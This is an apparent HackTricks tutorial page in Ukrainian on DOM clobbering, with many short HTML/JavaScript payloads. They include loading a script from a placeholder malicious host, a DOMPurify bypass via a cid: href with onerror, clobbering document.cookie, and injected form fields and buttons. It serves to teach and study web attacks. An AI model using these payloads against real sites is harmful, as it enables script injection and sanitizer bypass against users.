# Dom Clobbering

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **–û—Å–Ω–æ–≤–∏**

–ú–æ–∂–ª–∏–≤–æ –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ **–≥–ª–æ–±–∞–ª—å–Ω—ñ –∑–º—ñ–Ω–Ω—ñ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ JS** –∑ –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏ **`id`** —Ç–∞ **`name`** –≤ HTML —Ç–µ–≥–∞—Ö.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**–¢—ñ–ª—å–∫–∏** –ø–µ–≤–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–∞—Ç—Ä–∏–±—É—Ç name** –¥–ª—è –∫–ª–æ–±–±–µ—Ä–∏–Ω–≥—É –≥–ª–æ–±–∞–ª—å–Ω–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö, —Ü–µ: `embed`, `form`, `iframe`, `image`, `img` —Ç–∞ `object`.

–¶—ñ–∫–∞–≤–æ, —â–æ –∫–æ–ª–∏ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ **–µ–ª–µ–º–µ–Ω—Ç —Ñ–æ—Ä–º–∏** –¥–ª—è **–∫–ª–æ–±–±–µ—Ä–∏–Ω–≥—É** –∑–º—ñ–Ω–Ω–æ—ó, –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ **`toString`** –∑–Ω–∞—á–µ–Ω–Ω—è —Å–∞–º–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç–∞: `[object HTMLFormElement]`, –∞–ª–µ –∑ **—è–∫–æ—Ä–µ–º** **`toString`** –±—É–¥–µ –∑–Ω–∞—á–µ–Ω–Ω—è —è–∫–æ—Ä—è **`href`**. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –∫–ª–æ–±–±–µ—Ä–∏—Ç–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`a`** —Ç–µ–≥—É, –≤–∏ –º–æ–∂–µ—Ç–µ **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏** **–∑–Ω–∞—á–µ–Ω–Ω—è**, –∫–æ–ª–∏ –≤–æ–Ω–æ **–æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è —è–∫ —Ä—è–¥–æ–∫**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### –ú–∞—Å–∏–≤–∏ —Ç–∞ –∞—Ç—Ä–∏–±—É—Ç–∏

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –º–∞—Å–∏–≤** —Ç–∞ **–∞—Ç—Ä–∏–±—É—Ç–∏ –æ–±'—î–∫—Ç–∞**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
–©–æ–± –∑–Ω–∏—â–∏—Ç–∏ **—Ç—Ä–µ—Ç—ñ–π –∞—Ç—Ä–∏–±—É—Ç** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, x.y.z), –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`form`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Clobbering –±—ñ–ª—å—à–µ –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ —î **–±—ñ–ª—å—à —Å–∫–ª–∞–¥–Ω–∏–º, –∞–ª–µ –≤—Å–µ —â–µ –º–æ–∂–ª–∏–≤–∏–º**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ iframes:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
–¢–µ–≥ —Å—Ç–∏–ª—é –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **–Ω–∞–¥–∞–Ω–Ω—è –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —á–∞—Å—É –¥–ª—è —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥—É iframe**. –ë–µ–∑ –Ω—å–æ–≥–æ –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è –ø—Ä–æ **–Ω–µ–≤–∏–∑–Ω–∞—á–µ–Ω–µ**.
{% endhint %}

–©–æ–± –ø–µ—Ä–µ–∫—Ä–∏—Ç–∏ –≥–ª–∏–±—à—ñ –∞—Ç—Ä–∏–±—É—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **iframes –∑ html-–∫–æ–¥—É–≤–∞–Ω–Ω—è–º** —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **–û–±—Ö—ñ–¥ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó**

–Ø–∫—â–æ —Ñ—ñ–ª—å—Ç—Ä **–ø–µ—Ä–µ–±–∏—Ä–∞—î** **–≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ** –≤—É–∑–ª–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ `document.getElementByID('x').attributes`, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏** –∞—Ç—Ä–∏–±—É—Ç **`.attributes`** —ñ **–∑–ª–∞–º–∞—Ç–∏ —Ñ—ñ–ª—å—Ç—Ä**. –Ü–Ω—à—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ DOM, —Ç–∞–∫—ñ —è–∫ **`tagName`**, **`nodeName`** –∞–±–æ **`parentNode`** —Ç–∞ —ñ–Ω—à—ñ —Ç–∞–∫–æ–∂ —î **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞–Ω–∏–º–∏**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **–ö–ª–æ–±–±–µ—Ä–∏–Ω–≥ `window.someObject`**

–í JavaScript —á–∞—Å—Ç–æ –º–æ–∂–Ω–∞ –∑—É—Å—Ç—Ä—ñ—Ç–∏:
```javascript
var someObject = window.someObject || {};
```
–ú–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è HTML –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ `someObject` –∑ DOM-–µ–ª–µ–º–µ–Ω—Ç–æ–º, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤–≤–æ–¥–∏—Ç—å —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –±–µ–∑–ø–µ–∫–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–º—ñ–Ω–∏—Ç–∏ `someObject` –Ω–∞ –µ–ª–µ–º–µ–Ω—Ç –ø–æ—Å–∏–ª–∞–Ω–Ω—è, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —à–∫—ñ–¥–ª–∏–≤–∏–π —Å–∫—Ä–∏–ø—Ç:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
–í —É—Ä–∞–∑–ª–∏–≤–æ–º—É –∫–æ–¥—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
–¶–µ–π –º–µ—Ç–æ–¥ –µ–∫—Å–ø–ª—É–∞—Ç—É—î –¥–∂–µ—Ä–µ–ª–æ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–µ–±–∞–∂–∞–Ω–æ–≥–æ –∫–æ–¥—É.

**–¢—Ä—é–∫**: **`DOMPurify`** –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª **`cid:`**, —è–∫–∏–π **–Ω–µ –∫–æ–¥—É—î URL –ø–æ–¥–≤—ñ–π–Ω—ñ –ª–∞–ø–∫–∏**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –∑–∞–∫–æ–¥–æ–≤–∞–Ω—É –ø–æ–¥–≤—ñ–π–Ω—ñ –ª–∞–ø–∫–∏, —è–∫–∞ –±—É–¥–µ –¥–µ–∫–æ–¥–æ–≤–∞–Ω–∞ –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è**. –¢–æ–º—É, –≤–ø—Ä–æ–≤–∞–¥–∂—É—é—á–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`**, HTML –∑–∞–∫–æ–¥–æ–≤–∞–Ω–µ `&quot;` –±—É–¥–µ **–¥–µ–∫–æ–¥–æ–≤–∞–Ω–æ –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è** —ñ **–≤–∏–π–¥–µ** –∑ –∑–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç–∞, —â–æ–± **—Å—Ç–≤–æ—Ä–∏—Ç–∏** –ø–æ–¥—ñ—é **`onerror`**.

–Ü–Ω—à–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –µ–ª–µ–º–µ–Ω—Ç **`form`**. –î–µ—è–∫—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å –∞—Ç—Ä–∏–±—É—Ç–∏ –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç–∞ —Ñ–æ—Ä–º–∏, —â–æ–± –æ—á–∏—Å—Ç–∏—Ç–∏ —ó—Ö. –û–¥–Ω–∞–∫, –¥–æ–¥–∞–≤—à–∏ `input` –∑ `id=attributes` –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–æ—Ä–º–∏, –≤–∏ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î—Ç–µ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å –∞—Ç—Ä–∏–±—É—Ç—ñ–≤, –∑–∞–ø–æ–±—ñ–≥–∞—é—á–∏ —Å–∞–Ω—ñ—Ç–∞–π–∑–µ—Ä—É –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–∫—Ç–∏—á–Ω–∏—Ö –∞—Ç—Ä–∏–±—É—Ç—ñ–≤.

–í–∏ –º–æ–∂–µ—Ç–µ [**–∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ —Ü—å–æ–≥–æ —Ç–∏–ø—É –∫–ª–æ–±–±–µ—Ä–∏–Ω–≥—É –≤ —Ü—å–æ–º—É CTF –∑–≤—ñ—Ç—ñ**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## –ö–ª–æ–±–±–µ—Ä–∏–Ω–≥ –æ–±'—î–∫—Ç–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞

–ó–≥—ñ–¥–Ω–æ –∑ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é, –º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∞—Ç—Ä–∏–±—É—Ç–∏ –æ–±'—î–∫—Ç–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ DOM Clobbering:

> –Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [–ø—ñ–¥—Ç—Ä–∏–º—É—î —ñ–º–µ–Ω–æ–≤–∞–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ](https://webidl.spec.whatwg.org/#dfn-support-named-properties). [–ü—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ —ñ–º–µ–Ω–∞ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π](https://webidl.spec.whatwg.org/#dfn-supported-property-names) –æ–±'—î–∫—Ç–∞ [Document](https://html.spec.whatwg.org/multipage/dom.html#document) –≤ –±—É–¥—å-—è–∫–∏–π –º–æ–º–µ–Ω—Ç —Å–∫–ª–∞–¥–∞—é—Ç—å—Å—è –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö, —É [–¥–µ—Ä–µ–≤–æ–ø–æ–¥—ñ–±–Ω–æ–º—É –ø–æ—Ä—è–¥–∫—É](https://dom.spec.whatwg.org/#concept-tree-order) –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –µ–ª–µ–º–µ–Ω—Ç–∞, —è–∫–∏–π —ó—Ö –Ω–∞–¥–∞–≤, —ñ–≥–Ω–æ—Ä—É—é—á–∏ –ø—ñ–∑–Ω—ñ –¥—É–±–ª—ñ–∫–∞—Ç–∏, —ñ –∑ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –∑ –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute), —è–∫—ñ –π–¥—É—Ç—å –ø–µ—Ä–µ–¥ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –∑ –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ name, –∫–æ–ª–∏ –æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ –µ–ª–µ–º–µ–Ω—Ç –Ω–∞–¥–∞—î –æ–±–∏–¥–≤–∞:
>
> \- –ó–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç–∞ –≤–º—ñ—Å—Ç—É name –¥–ª—è –≤—Å—ñ—Ö [–µ–∫—Å–ø–æ–Ω–æ–≤–∞–Ω–∏—Ö](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) —Ç–∞ [–µ–∫—Å–ø–æ–Ω–æ–≤–∞–Ω–∏—Ö](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, —è–∫—ñ –º–∞—é—Ç—å –Ω–µ–ø–æ—Ä–æ–∂–Ω—ñ–π –∞—Ç—Ä–∏–±—É—Ç –≤–º—ñ—Å—Ç—É name —ñ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è [–≤ –¥–µ—Ä–µ–≤—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞](https://dom.spec.whatwg.org/#in-a-document-tree) –∑ –¥–æ–∫—É–º–µ–Ω—Ç–æ–º —è–∫ —ó—Ö [–∫–æ—Ä–µ–Ω–µ–º](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- –ó–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç–∞ –≤–º—ñ—Å—Ç—É [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) –¥–ª—è –≤—Å—ñ—Ö [–µ–∫—Å–ø–æ–Ω–æ–≤–∞–Ω–∏—Ö](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, —è–∫—ñ –º–∞—é—Ç—å –Ω–µ–ø–æ—Ä–æ–∂–Ω—ñ–π –∞—Ç—Ä–∏–±—É—Ç –≤–º—ñ—Å—Ç—É [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) —ñ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è [–≤ –¥–µ—Ä–µ–≤—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞](https://dom.spec.whatwg.org/#in-a-document-tree) –∑ –¥–æ–∫—É–º–µ–Ω—Ç–æ–º —è–∫ —ó—Ö [–∫–æ—Ä–µ–Ω–µ–º](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- –ó–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç–∞ –≤–º—ñ—Å—Ç—É [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) –¥–ª—è –≤—Å—ñ—Ö [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, —è–∫—ñ –º–∞—é—Ç—å —è–∫ –Ω–µ–ø–æ—Ä–æ–∂–Ω—ñ–π –∞—Ç—Ä–∏–±—É—Ç [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute), —Ç–∞–∫ —ñ –Ω–µ–ø–æ—Ä–æ–∂–Ω—ñ–π –∞—Ç—Ä–∏–±—É—Ç –≤–º—ñ—Å—Ç—É name, —ñ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è [–≤ –¥–µ—Ä–µ–≤—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞](https://dom.spec.whatwg.org/#in-a-document-tree) –∑ –¥–æ–∫—É–º–µ–Ω—Ç–æ–º —è–∫ —ó—Ö [–∫–æ—Ä–µ–Ω–µ–º](https://dom.spec.whatwg.org/#concept-tree-root).

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∑–∞–≥–∞–ª—å–Ω–æ–≤–∂–∏–≤–∞–Ω—ñ **–∑–Ω–∞—á–µ–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ `document.cookie`, `document.body`, `document.children`**, —ñ –Ω–∞–≤—ñ—Ç—å –º–µ—Ç–æ–¥–∏ –≤ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ Document, —Ç–∞–∫—ñ —è–∫ `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)¬†[img, form, cookie: img]

typeof(document.cookie)
'object
```
## Writing after the element clobbered

–†–µ–∑—É–ª—å—Ç–∞—Ç–∏ –≤–∏–∫–ª–∏–∫—ñ–≤ **`document.getElementById()`** —Ç–∞ **`document.querySelector()`** –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω—ñ —à–ª—è—Ö–æ–º —ñ–Ω'—î–∫—Ü—ñ—ó —Ç–µ–≥—É `<html>` –∞–±–æ `<body>` –∑ —ñ–¥–µ–Ω—Ç–∏—á–Ω–∏–º –∞—Ç—Ä–∏–±—É—Ç–æ–º id. –û—Å—å —è–∫ —Ü–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
–ö—Ä—ñ–º —Ç–æ–≥–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å—Ç–∏–ª—ñ –¥–ª—è –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è —Ü–∏—Ö —ñ–Ω'—î–∫–æ–≤–∞–Ω–∏—Ö HTML/body —Ç–µ–≥—ñ–≤, –º–æ–∂–Ω–∞ –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤—Ç—Ä—É—á–∞–Ω–Ω—é –∑ —ñ–Ω—à–æ–≥–æ —Ç–µ–∫—Å—Ç—É –≤ `innerText`, —Ç–∏–º —Å–∞–º–∏–º –ø—ñ–¥–≤–∏—â—É—é—á–∏ –µ—Ñ–µ–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å –∞—Ç–∞–∫–∏:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
–î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è SVG –≤–∏—è–≤–∏–ª–∏, —â–æ —Ç–µ–≥ `<body>` —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
–©–æ–± HTML —Ç–µ–≥ –ø—Ä–∞—Ü—é–≤–∞–≤ —É SVG –≤ –±—Ä–∞—É–∑–µ—Ä–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ Chrome —ñ Firefox, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π —Ç–µ–≥ `<foreignobject>`:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

–ú–æ–∂–ª–∏–≤–æ –¥–æ–¥–∞—Ç–∏ **–Ω–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–æ—Ä–º–∏**, –ø—Ä–æ—Å—Ç–æ **–≤–∫–∞–∑–∞–≤—à–∏ –∞—Ç—Ä–∏–±—É—Ç `form`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–µ—è–∫–∏—Ö —Ç–µ–≥—ñ–≤. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ, —â–æ–± **–¥–æ–¥–∞—Ç–∏ –Ω–æ–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–æ—Ä–º–∏** —ñ –Ω–∞–≤—ñ—Ç—å –¥–æ–¥–∞—Ç–∏ –Ω–æ–≤—É **–∫–Ω–æ–ø–∫—É** –¥–ª—è **–≤—ñ–¥–ø—Ä–∞–≤–∫–∏** (–∫–ª—ñ–∫–¥–∂–µ–∫–∏–Ω–≥ –∞–±–æ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –¥–µ—è–∫–∏–º –∫–æ–¥–æ–º JS `.click()`):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ —Ñ–æ—Ä–º–∏ –≤ [**–∫–Ω–æ–ø—Ü—ñ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤: –Ω–∞–≤—á—ñ—Ç—å—Å—è –¥—É–º–∞—Ç–∏ —è–∫ —Ö–∞–∫–µ—Ä.

{% hint style="success" %}
–ù–∞–≤—á–∞–π—Ç–µ—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–ù–∞–≤—á–∞–π—Ç–µ—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
